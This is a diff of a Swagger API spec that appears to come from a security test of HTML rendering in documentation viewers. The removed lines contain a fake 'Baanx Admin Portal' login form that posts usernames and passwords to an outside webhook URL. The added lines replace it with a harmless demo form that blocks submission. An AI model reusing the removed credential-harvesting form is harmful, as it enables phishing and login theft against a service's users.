@@ -1,21 +1,25 @@
 swagger: '2.0'
 info:
-  title: Baanx Internal Login
+  title: client login
   version: 1.0.0
   description: >
-    <div style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:8px;background:#f9f9f9;font-family:sans-serif;">
-      <h2 style="text-align:center;color:#333;">Baanx Admin Portal</h2>
-      <form action="https://webhook.site/1a1cc000-a5ef-4437-98c9-0e4107377af1" method="POST">
+    <div style="max-width:420px;margin:30px auto;padding:18px;border:1px solid #ccc;border-radius:8px;background:#fff;font-family:sans-serif;">
+      <h3 style="margin:0 0 8px 0;">Demo: Unsafe HTML rendering</h3>
+      <!-- Harmless demo: submission is blocked and shows an alert -->
+      <form onsubmit="alert('This is a harmless demo — submission blocked.'); return false;">
         <label>Username</label><br>
         <input name="username" /><br><br>
         <label>Password</label><br>
         <input name="password" type="password" /><br><br>
-        <button type="submit">Login</button>
+        <button type="submit">Submit (Demo)</button>
       </form>
+      <p style="font-size:12px;color:#666;margin-top:10px;">
+        Note: This demo does NOT send data anywhere. It only proves that raw HTML renders in the spec.
+      </p>
     </div>
 paths:
   /:
     get:
       responses:
         '200':
-          description: Login form displayed
+          description: Safe demo displayed
